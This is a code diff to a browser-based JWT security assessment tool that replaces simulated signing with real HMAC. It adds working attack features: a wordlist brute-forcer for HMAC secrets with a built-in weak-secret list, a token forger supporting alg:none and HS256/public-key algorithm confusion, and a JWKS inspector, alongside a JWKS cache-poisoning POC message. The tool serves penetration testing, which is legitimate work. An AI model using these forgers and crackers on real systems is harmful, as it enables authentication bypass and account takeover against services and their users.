@@ -493,86 +493,386 @@ X-Cache-Poison: true
     alert(`🔴 CVE-2024-45234: JWKS Cache Poisoning\n\nMalicious JWKS Response:\n${maliciousResponse}\n\nPOC Steps:\n1. Compromise or MitM JWKS endpoint\n2. Serve malicious keys with long cache headers\n3. Legitimate JWKS gets cached with attacker keys\n4. All subsequent token validations use malicious keys\n\nCache Persistence:\n- max-age: 1 year (31536000 seconds)\n- Affects all users until cache expires\n- Difficult to detect and remediate\n\nAffected: JWKS caching implementations\nImpact: Persistent authentication bypass`);
 }
 
-// JWT Tools
-function encodeJWT() {
-    const payload = document.getElementById('encode-payload').value;
-    const secret = document.getElementById('encode-secret').value;
+// ===== Real cryptographic primitives (Web Crypto API) =====
+// Every signing/verification tool below uses actual HMAC, not a simulation.
 
-    if (!payload || !secret) {
-        alert('Please provide both payload and secret');
+const HASH_BY_ALG = { HS256: 'SHA-256', HS384: 'SHA-384', HS512: 'SHA-512' };
+
+const BUILTIN_SECRETS = [
+    'secret', 'password', 'admin', '123456', 'jwt_secret', 'your-256-bit-secret',
+    'your-secret-key', 'secretkey', 'key', 'mysecret', 'test', 'debug', 'dev',
+    'production', 'changeme', 'letmein', 'qwerty', 'supersecret', 'supersecretkey',
+    's3cr3t', 'jwtsecret', 'jwt-secret', 'shhhhh', 'p@ssw0rd', 'welcome', 'default',
+    'demo', 'sample', '1234567890', 'abc123', 'topsecret', 'private',
+    'encryption_key', 'hs256secret', 'symmetric-key', '0123456789abcdef',
+    'my-secret', 'node_jwt_secret', 'express-secret'
+];
+
+function b64urlEncodeStr(str) {
+    return btoa(str).replace(/\+/g, '-').replace(/\//g, '_').replace(/=+$/, '');
+}
+
+function base64UrlToBytes(str) {
+    str = str.replace(/-/g, '+').replace(/_/g, '/');
+    str += '='.repeat((4 - str.length % 4) % 4);
+    const binary = atob(str);
+    const bytes = new Uint8Array(binary.length);
+    for (let i = 0; i < binary.length; i++) bytes[i] = binary.charCodeAt(i);
+    return bytes;
+}
+
+function bufToBase64Url(buf) {
+    const bytes = new Uint8Array(buf);
+    let binary = '';
+    bytes.forEach(b => binary += String.fromCharCode(b));
+    return btoa(binary).replace(/\+/g, '-').replace(/\//g, '_').replace(/=+$/, '');
+}
+
+function atobUrl(str) {
+    str += '='.repeat((4 - str.length % 4) % 4);
+    str = str.replace(/-/g, '+').replace(/_/g, '/');
+    return atob(str);
+}
+
+async function hmacSign(hashName, secret, message) {
+    const key = await crypto.subtle.importKey(
+        'raw', new TextEncoder().encode(secret),
+        { name: 'HMAC', hash: hashName }, false, ['sign']
+    );
+    return crypto.subtle.sign('HMAC', key, new TextEncoder().encode(message));
+}
+
+function escapeHtml(str) {
+    return String(str).replace(/[&<>]/g, c => ({ '&': '&amp;', '<': '&lt;', '>': '&gt;' }[c]));
+}
+
+function toolResult(value, label, opts = {}) {
+    const id = 'tool-out-' + Math.random().toString(36).slice(2, 9);
+    const analyzeBtn = opts.analyze
+        ? `<button class="btn-copy" onclick="sendToAnalyzer(document.getElementById('${id}').textContent)">Analyze</button>`
+        : '';
+    return `
+        <div class="tool-result">
+            <strong>${escapeHtml(label)}</strong>
+            <code id="${id}" class="tool-code">${escapeHtml(value)}</code>
+            <div class="tool-result-actions">
+                <button class="btn-copy" onclick="copyToolResult('${id}')">Copy</button>
+                ${analyzeBtn}
+            </div>
+        </div>`;
+}
+
+function toolMessage(msg, type = 'info') {
+    return `<div class="tool-note tool-note-${type}">${escapeHtml(msg)}</div>`;
+}
+
+function copyToolResult(id) {
+    const el = document.getElementById(id);
+    if (!el) return;
+    navigator.clipboard.writeText(el.textContent).then(() => {
+        const btn = el.parentElement.querySelector('.btn-copy');
+        if (btn) {
+            const prev = btn.textContent;
+            btn.textContent = 'Copied';
+            setTimeout(() => { btn.textContent = prev; }, 1200);
+        }
+    }).catch(() => {});
+}
+
+function sendToAnalyzer(token) {
+    document.getElementById('jwt-input').value = token;
+    if (window.jwtApp) {
+        window.jwtApp.switchTab('analyzer');
+        window.jwtApp.analyzeJWT();
+    }
+}
+
+function downloadText(filename, text) {
+    const blob = new Blob([text], { type: 'text/plain' });
+    const url = URL.createObjectURL(blob);
+    const a = document.createElement('a');
+    a.href = url;
+    a.download = filename;
+    document.body.appendChild(a);
+    a.click();
+    a.remove();
+    URL.revokeObjectURL(url);
+}
+
+// ===== JWT Tools =====
+
+async function encodeJWT() {
+    const resultEl = document.getElementById('encoded-result');
+    const payloadStr = document.getElementById('encode-payload').value;
+    const secret = document.getElementById('encode-secret').value;
+    const alg = document.getElementById('encode-alg').value;
+
+    if (!payloadStr) {
+        resultEl.innerHTML = toolMessage('Provide a JSON payload.', 'warn');
+        return;
+    }
+    if (alg !== 'none' && !secret) {
+        resultEl.innerHTML = toolMessage('Provide a secret, or choose alg "none".', 'warn');
         return;
     }
 
     try {
-        const header = { alg: "HS256", typ: "JWT" };
-        const encodedHeader = btoa(JSON.stringify(header)).replace(/=/g, '');
-        const encodedPayload = btoa(JSON.stringify(JSON.parse(payload))).replace(/=/g, '');
+        const payload = JSON.parse(payloadStr);
+        const header = { alg: alg === 'none' ? 'none' : alg, typ: 'JWT' };
+        const encodedHeader = b64urlEncodeStr(JSON.stringify(header));
+        const encodedPayload = b64urlEncodeStr(JSON.stringify(payload));
+        const signingInput = `${encodedHeader}.${encodedPayload}`;
 
-        // Simulate HMAC-SHA256 (in real scenario, use crypto library)
-        const signature = btoa(`${encodedHeader}.${encodedPayload}.${secret}`).replace(/=/g, '').substring(0, 43);
+        let signature = '';
+        if (alg !== 'none') {
+            const sigBuf = await hmacSign(HASH_BY_ALG[alg], secret, signingInput);
+            signature = bufToBase64Url(sigBuf);
+        }
 
-        const jwt = `${encodedHeader}.${encodedPayload}.${signature}`;
-        document.getElementById('encoded-result').innerHTML = `
-            <div style="margin-top: 1rem; padding: 1rem; background: var(--secondary-bg); border-radius: 6px;">
-                <strong>Generated JWT:</strong><br>
-                <code style="word-break: break-all;">${jwt}</code>
-            </div>
-        `;
+        const token = `${signingInput}.${signature}`;
+        resultEl.innerHTML = toolResult(token, 'Generated JWT (real HMAC signature)', { analyze: true });
     } catch (error) {
-        alert('Error encoding JWT: ' + error.message);
+        resultEl.innerHTML = toolMessage('Error encoding JWT: ' + error.message, 'error');
     }
 }
 
-function verifyJWT() {
-    const token = document.getElementById('verify-token').value;
+async function verifyJWT() {
+    const resultEl = document.getElementById('verify-result');
+    const token = document.getElementById('verify-token').value.trim();
     const secret = document.getElementById('verify-secret').value;
 
-    if (!token || !secret) {
-        alert('Please provide both token and secret');
+    if (!token) {
+        resultEl.innerHTML = toolMessage('Paste a token to verify.', 'warn');
         return;
     }
 
     try {
         const parts = token.split('.');
-        if (parts.length !== 3) {
-            throw new Error('Invalid JWT format');
+        if (parts.length !== 3) throw new Error('Invalid JWT format (expected 3 parts).');
+
+        const header = JSON.parse(atobUrl(parts[0]));
+        const signingInput = `${parts[0]}.${parts[1]}`;
+
+        if (header.alg === 'none') {
+            const unsigned = parts[2] === '';
+            resultEl.innerHTML = toolMessage(
+                unsigned
+                    ? '"none" algorithm with an empty signature segment — if the server accepts this, authentication is fully bypassed.'
+                    : '"none" algorithm with a non-empty signature segment — some parsers still accept this blindly.',
+                'warn'
+            );
+            return;
         }
 
-        // Simulate signature verification
-        const isValid = parts[2].length > 0; // Simplified check
+        const hashName = HASH_BY_ALG[header.alg];
+        if (!hashName) {
+            resultEl.innerHTML = toolMessage(
+                `alg "${header.alg}" is not HMAC — this tool verifies HS256/384/512 locally. RS/ES/PS tokens need the public key, not a shared secret.`,
+                'warn'
+            );
+            return;
+        }
+        if (!secret) {
+            resultEl.innerHTML = toolMessage('Provide the candidate secret to check against.', 'warn');
+            return;
+        }
 
-        document.getElementById('verify-result').innerHTML = `
-            <div style="margin-top: 1rem; padding: 1rem; background: var(--secondary-bg); border-radius: 6px;">
-                <strong>Verification Result:</strong><br>
-                <span style="color: ${isValid ? 'var(--success-color)' : 'var(--error-color)'}">
-                    ${isValid ? '✅ Signature Valid' : '❌ Signature Invalid'}
-                </span>
-            </div>
-        `;
+        const expectedSig = bufToBase64Url(await hmacSign(hashName, secret, signingInput));
+        const valid = expectedSig === parts[2];
+        resultEl.innerHTML = `<div class="tool-result"><strong>Result:</strong> <span class="${valid ? 'ok-text' : 'bad-text'}">${valid ? 'Signature valid — secret matches.' : 'Signature does not match this secret.'}</span></div>`;
     } catch (error) {
-        alert('Error verifying JWT: ' + error.message);
+        resultEl.innerHTML = toolMessage('Error verifying JWT: ' + error.message, 'error');
     }
 }
 
-function convertTimestamp() {
-    const timestamp = document.getElementById('timestamp-input').value;
+async function crackSecret() {
+    const resultEl = document.getElementById('crack-result');
+    const token = document.getElementById('crack-token').value.trim();
+    const customList = document.getElementById('crack-wordlist').value;
 
-    if (!timestamp) {
-        alert('Please provide a timestamp');
+    if (!token) {
+        resultEl.innerHTML = toolMessage('Paste a token to attack.', 'warn');
+        return;
+    }
+
+    const parts = token.split('.');
+    if (parts.length !== 3) {
+        resultEl.innerHTML = toolMessage('Invalid JWT format.', 'error');
+        return;
+    }
+
+    let header;
+    try {
+        header = JSON.parse(atobUrl(parts[0]));
+    } catch (error) {
+        resultEl.innerHTML = toolMessage('Could not decode the header: ' + error.message, 'error');
+        return;
+    }
+
+    const hashName = HASH_BY_ALG[header.alg];
+    if (!hashName) {
+        resultEl.innerHTML = toolMessage(`alg "${header.alg}" is not HMAC — a shared-secret brute force does not apply here.`, 'warn');
+        return;
+    }
+
+    const signingInput = `${parts[0]}.${parts[1]}`;
+    const wordlist = (customList.trim() ? customList.split('\n') : BUILTIN_SECRETS)
+        .map(w => w.trim()).filter(Boolean);
+
+    resultEl.innerHTML = toolMessage(`Trying ${wordlist.length} candidates against ${header.alg}…`, 'info');
+
+    let found = null;
+    for (let i = 0; i < wordlist.length; i++) {
+        const candidate = wordlist[i];
+        const sig = bufToBase64Url(await hmacSign(hashName, candidate, signingInput));
+        if (sig === parts[2]) {
+            found = candidate;
+            break;
+        }
+        if (i % 25 === 0) {
+            resultEl.innerHTML = toolMessage(`Trying ${wordlist.length} candidates against ${header.alg}… (${i + 1}/${wordlist.length})`, 'info');
+            await new Promise(r => setTimeout(r, 0));
+        }
+    }
+
+    if (found) {
+        resultEl.innerHTML = toolResult(found, 'Secret cracked');
+    } else {
+        resultEl.innerHTML = toolMessage(
+            `No match among ${wordlist.length} candidates. For a larger attack, export this token and try it offline with hashcat (-m 16500) or a bigger wordlist.`,
+            'warn'
+        );
+    }
+}
+
+function loadForge() {
+    const resultEl = document.getElementById('forge-result');
+    const token = document.getElementById('forge-token').value.trim();
+    const parts = token.split('.');
+
+    if (parts.length !== 3) {
+        resultEl.innerHTML = toolMessage('Invalid JWT format.', 'error');
         return;
     }
 
     try {
-        const date = new Date(parseInt(timestamp) * 1000);
-        document.getElementById('timestamp-result').innerHTML = `
-            <div style="margin-top: 1rem; padding: 1rem; background: var(--secondary-bg); border-radius: 6px;">
-                <strong>Converted Time:</strong><br>
-                ${date.toLocaleString()}<br>
-                <small>UTC: ${date.toUTCString()}</small>
+        const header = JSON.parse(atobUrl(parts[0]));
+        const payload = JSON.parse(atobUrl(parts[1]));
+        document.getElementById('forge-header').value = JSON.stringify(header, null, 2);
+        document.getElementById('forge-payload').value = JSON.stringify(payload, null, 2);
+        resultEl.innerHTML = toolMessage('Loaded. Edit the claims above, choose a signing mode, then forge.', 'info');
+    } catch (error) {
+        resultEl.innerHTML = toolMessage('Could not decode token: ' + error.message, 'error');
+    }
+}
+
+async function forgeToken() {
+    const resultEl = document.getElementById('forge-result');
+    const mode = document.getElementById('forge-mode').value;
+    const secret = document.getElementById('forge-secret').value;
+
+    try {
+        const header = JSON.parse(document.getElementById('forge-header').value || '{}');
+        const payload = JSON.parse(document.getElementById('forge-payload').value || '{}');
+
+        header.alg = mode === 'none' ? 'none' : 'HS256';
+        const encodedHeader = b64urlEncodeStr(JSON.stringify(header));
+        const encodedPayload = b64urlEncodeStr(JSON.stringify(payload));
+        const signingInput = `${encodedHeader}.${encodedPayload}`;
+
+        let signature = '';
+        if (mode !== 'none') {
+            if (!secret) throw new Error("Provide a secret (or the target's public key for the confusion mode).");
+            signature = bufToBase64Url(await hmacSign('SHA-256', secret, signingInput));
+        }
+
+        const token = `${signingInput}.${signature}`;
+        const note = mode === 'confusion'
+            ? 'Forged with HS256, using the pasted text as the HMAC key. This only works if the server verifies with that exact public key treated as a raw secret (the CVE-2016-10555 class of bug).'
+            : mode === 'none'
+                ? 'Forged with alg: none. Only works if the server skips signature verification for this algorithm.'
+                : 'Forged and resigned with the secret provided.';
+
+        resultEl.innerHTML = toolResult(token, 'Forged JWT', { analyze: true }) + toolMessage(note, 'info');
+    } catch (error) {
+        resultEl.innerHTML = toolMessage('Error forging token: ' + error.message, 'error');
+    }
+}
+
+async function inspectJWKS() {
+    const resultEl = document.getElementById('jwks-result');
+    const url = document.getElementById('jwks-url').value.trim();
+
+    if (!url) {
+        resultEl.innerHTML = toolMessage('Enter a JWKS URL.', 'warn');
+        return;
+    }
+
+    resultEl.innerHTML = toolMessage('Fetching…', 'info');
+
+    try {
+        const res = await fetch(url, { mode: 'cors' });
+        if (!res.ok) throw new Error(`HTTP ${res.status}`);
+        const data = await res.json();
+        const keys = data.keys || [];
+
+        if (!keys.length) {
+            resultEl.innerHTML = toolMessage('No "keys" array found in the response.', 'warn');
+            return;
+        }
+
+        const kidCounts = {};
+        keys.forEach(k => { kidCounts[k.kid] = (kidCounts[k.kid] || 0) + 1; });
+
+        const rows = keys.map(k => {
+            const flags = [];
+            if (k.kid && kidCounts[k.kid] > 1) flags.push('duplicate kid');
+            if (k.kty === 'oct') flags.push('symmetric key exposed');
+            return `<tr>
+                <td>${escapeHtml(k.kid ?? '—')}</td>
+                <td>${escapeHtml(k.kty ?? '—')}</td>
+                <td>${escapeHtml(k.alg ?? '—')}</td>
+                <td>${escapeHtml(k.use ?? '—')}</td>
+                <td>${flags.length ? escapeHtml(flags.join(', ')) : '—'}</td>
+            </tr>`;
+        }).join('');
+
+        resultEl.innerHTML = `
+            <div class="tool-result">
+                <strong>${keys.length} key(s) found</strong>
+                <table class="jwks-table">
+                    <thead><tr><th>kid</th><th>kty</th><th>alg</th><th>use</th><th>flags</th></tr></thead>
+                    <tbody>${rows}</tbody>
+                </table>
+            </div>
+            ${toolMessage('A duplicate kid shared between an RSA and an "oct" (symmetric) key is the classic setup for JWKS/algorithm confusion. A kty:"oct" entry means a symmetric secret is exposed at a public endpoint.', 'info')}
+        `;
+    } catch (error) {
+        resultEl.innerHTML = toolMessage('Fetch failed: ' + error.message + ' (often CORS — try testing from the target\'s own origin, or via Burp).', 'error');
+    }
+}
+
+function convertTimestamp() {
+    const resultEl = document.getElementById('timestamp-result');
+    const timestamp = document.getElementById('timestamp-input').value;
+
+    if (!timestamp) {
+        resultEl.innerHTML = toolMessage('Provide a Unix timestamp.', 'warn');
+        return;
+    }
+
+    try {
+        const date = new Date(parseInt(timestamp, 10) * 1000);
+        if (isNaN(date.getTime())) throw new Error('Not a valid timestamp.');
+        resultEl.innerHTML = `
+            <div class="tool-result">
+                <strong>Converted time</strong>
+                <code class="tool-code">${escapeHtml(date.toLocaleString())}</code>
+                <code class="tool-code">UTC: ${escapeHtml(date.toUTCString())}</code>
             </div>
         `;
     } catch (error) {
-        alert('Error converting timestamp: ' + error.message);
+        resultEl.innerHTML = toolMessage('Error converting timestamp: ' + error.message, 'error');
     }
 }
 
@@ -582,21 +882,24 @@ function generateWordlist() {
 
     switch (type) {
         case 'common':
-            wordlist = ['secret', 'password', 'admin', '123456', 'jwt_secret', 'your-256-bit-secret', 'key', 'test', 'debug', 'dev', 'production'];
+            wordlist = BUILTIN_SECRETS;
             break;
         case 'numeric':
-            wordlist = ['123456', '000000', '111111', '123123', '654321', '999999'];
+            wordlist = ['123456', '000000', '111111', '123123', '654321', '999999', '121212', '112233'];
             break;
         case 'alphanumeric':
-            wordlist = ['abc123', 'test123', 'admin123', 'pass123', 'user123'];
+            wordlist = ['abc123', 'test123', 'admin123', 'pass123', 'user123', 'secret1', 'jwt12345'];
             break;
     }
 
     document.getElementById('wordlist-result').innerHTML = `
-        <div style="margin-top: 1rem; padding: 1rem; background: var(--secondary-bg); border-radius: 6px;">
-            <strong>Generated Wordlist (${wordlist.length} entries):</strong><br>
-            <div style="max-height: 200px; overflow-y: auto; margin-top: 0.5rem;">
-                ${wordlist.map(word => `<div style="padding: 0.2rem 0; font-family: monospace;">${word}</div>`).join('')}
+        <div class="tool-result">
+            <strong>Generated wordlist (${wordlist.length} entries)</strong>
+            <div class="wordlist-box">
+                ${wordlist.map(word => `<div class="wordlist-entry">${escapeHtml(word)}</div>`).join('')}
+            </div>
+            <div class="tool-result-actions">
+                <button class="btn-copy" onclick="downloadText('jwt-wordlist.txt', ${JSON.stringify(wordlist.join('\n'))})">Download .txt</button>
             </div>
         </div>
     `;
@@ -604,5 +907,5 @@ function generateWordlist() {
 
 // Initialize the application
 document.addEventListener('DOMContentLoaded', () => {
-    new JWTSecurityAssessment();
+    window.jwtApp = new JWTSecurityAssessment();
 });
